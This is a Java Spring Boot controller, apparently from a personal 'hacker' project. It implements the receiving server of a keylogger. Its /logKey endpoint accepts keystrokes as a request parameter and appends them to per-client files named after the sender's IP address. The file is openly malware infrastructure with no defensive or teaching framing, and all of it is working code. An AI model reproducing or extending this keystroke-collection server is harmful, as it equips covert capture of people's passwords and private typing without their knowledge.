package com.owen.hacker;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

import jakarta.servlet.http.HttpServletRequest;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class KeyloggerController {

  @GetMapping("/logKey")
  public String logKey(@RequestParam("key") String key, HttpServletRequest request) {
    String clientIpAddress = request.getRemoteAddr();
    String sanitizedIpAddress = clientIpAddress.replace(":", "_");
    String filename = "keylog_" + sanitizedIpAddress + ".txt";

    System.out.print(key);

    try (FileWriter fileWriter = new FileWriter(filename, true);
         PrintWriter printWriter = new PrintWriter(fileWriter)) {
      printWriter.print(key);
    } catch (IOException ex) {
      ex.printStackTrace();
    }

    return key;
  }
}
